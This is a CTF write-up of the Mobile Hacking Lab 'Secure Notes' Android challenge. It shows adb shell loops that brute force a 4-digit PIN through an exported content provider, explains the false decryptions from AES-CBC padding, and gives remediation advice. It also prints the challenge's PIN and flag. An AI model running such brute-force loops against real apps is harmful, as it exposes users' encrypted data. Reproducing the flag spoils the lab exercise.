---
title: "MHL Secure Notes Writeup"
date: 2026-10-27
categories: [Mobile Hacking, Android]
tags: [android, mobile-hacking-lab, content-provider, brute-force, crypto, adb]
---

Mobile Hacking Lab, Android, content provider PIN brute force.

## Summary

Secure Notes stores a secret encrypted with a key derived from a 4 digit PIN. The decryption logic lives in an exported content provider that requires no permission and has no attempt limiting. Any app on the device, or `adb shell content query`, can try all 10,000 PINs and read the decrypted secret.

- **PIN:** 2580
- **Flag:** `CTF{D1d_y0u_gu3ss_1t!1?}`
- **Weaknesses:** exported provider without permission, tiny keyspace, no rate limiting, unauthenticated encryption mode

## Recon

I decompiled the APK with jadx and read the manifest and the two relevant classes.

The manifest declares the provider like this:

```xml
<provider
    android:name="com.mobilehackinglab.securenotes.SecretDataProvider"
    android:enabled="true"
    android:exported="true"
    android:authorities="com.mobilehackinglab.securenotes.secretprovider"/>
```

`exported="true"` with no `android:permission` means any installed app can talk to it. The authority is `com.mobilehackinglab.securenotes.secretprovider`.

## Code analysis

`MainActivity` is only a PIN entry screen. It builds a selection string and queries the provider:

```java
Uri uri = Uri.parse("content://com.mobilehackinglab.securenotes.secretprovider");
String selection = "pin=" + pin;
Cursor cursor = getContentResolver().query(uri, null, selection, null, null);
```

The interesting logic is in `SecretDataProvider`:

1. `onCreate()` loads `assets/config.properties` and reads `encryptedSecret`, `salt`, `iv` and `iterationCount`.
2. `query()` rejects anything whose `selection` does not start with `pin=`, parses the rest as an integer, and zero pads it to 4 digits with `%04d`.
3. `decryptSecret()` derives a key with PBKDF2WithHmacSHA1 (256 bit) from the PIN, then decrypts with `AES/CBC/PKCS5Padding`.
4. On any exception the provider returns `null`. On success it returns a one row `MatrixCursor` with a `Secret` column.

The provider ignores the URI path, so any path under the authority works. That is why `/item` in my command is fine.

Problems visible from the source:

- The PIN is the only secret and has 10,000 possible values.
- Nothing limits or logs attempts.
- The provider is reachable by any app.
- The salt, IV, iteration count and ciphertext ship inside the APK.
- CBC with PKCS5 padding has no integrity check, so a wrong key sometimes still "succeeds" (see false positives below).

## Exploitation

The task hint says the challenge can be solved without writing an app, so I brute forced it with `adb`:

```bash
for i in $(seq 1000 9999); do
  adb shell content query \
    --uri content://com.mobilehackinglab.securenotes.secretprovider/item \
    --where pin=$i && echo $i
done
```

### Reading the output

This loop prints the result of each query first and the PIN after it. `adb shell content query` exits 0 even when it prints `No result found.`, so `&& echo $i` always runs and acts as a counter. That means the PIN for a result is the number printed **below** it:

```
Row: 0 Secret=CTF{D1d_y0u_gu3ss_1t!1?}
2580
```

So the correct PIN is **2580**, not the number above the `Row:` line. I misattributed this at first, so check which side of the result your counter prints on.

One more note: I started the range at 1000, but the provider formats with `%04d`, so 0000 to 0999 are valid PINs too. It did not matter here, but the full range is `seq -w 0 9999`.

A cleaner loop that prints the PIN with the result and stops on the flag:

```bash
for i in $(seq -w 0 9999); do
  out=$(adb shell content query \
    --uri content://com.mobilehackinglab.securenotes.secretprovider \
    --where "pin=$i")
  echo "$out" | grep -q 'CTF{' && echo "PIN=$i $out" && break
done
```

## The garbage hits

While the loop ran, two extra `Row: 0 Secret=` lines appeared with binary noise instead of text. They belong to PINs 2241 and 2463. These are false positives:

- With a wrong key, AES-CBC decryption produces random bytes.
- `doFinal` throws a `BadPaddingException` unless the last byte happens to look like valid PKCS5 padding. That happens with probability of roughly 1 in 256.
- When it passes, the provider converts the random bytes with `new String(bytes, UTF_8)`. Invalid sequences become replacement characters, so the cursor holds junk instead of `null`.
- Across 10,000 PINs you expect around 39 such hits. Seeing 2 in a slice of a few hundred PINs is in line with that.

The real hit is easy to tell apart: it is readable and matches the flag format.

## Alternative: offline brute force

Because `config.properties` is in the APK assets, you can skip the device entirely. Extract the salt, IV, iteration count and ciphertext, then replicate the provider in Python: PBKDF2-HMAC-SHA1 with 256 bit output, then AES-256-CBC decrypt, then check padding and printable output. This is faster, avoids adb overhead, and has the same false positive behavior, so filter on `CTF{`.

## Remediation

- Set `android:exported="false"`, or protect the provider with a signature level permission.
- Do not rely on a 4 digit PIN as the only secret. Use a high entropy key, ideally hardware backed in the Android Keystore.
- Add attempt limiting and lockout, enforced where an attacker cannot reset it.
- Do not ship decryption parameters and ciphertext in a place any user can read, if the PIN is the only protection.
- Use an authenticated mode such as AES-GCM so wrong keys fail cleanly instead of sometimes returning garbage.

## Takeaways

- Always check `exported` and `permission` on providers, receivers and activities first.
- A weak PIN guarded only by key derivation is a brute force problem, not a crypto problem. PBKDF2 slows each guess but cannot rescue 10,000 possibilities.
- When a brute force loop prints results and counters separately, confirm which side the counter is on before submitting.
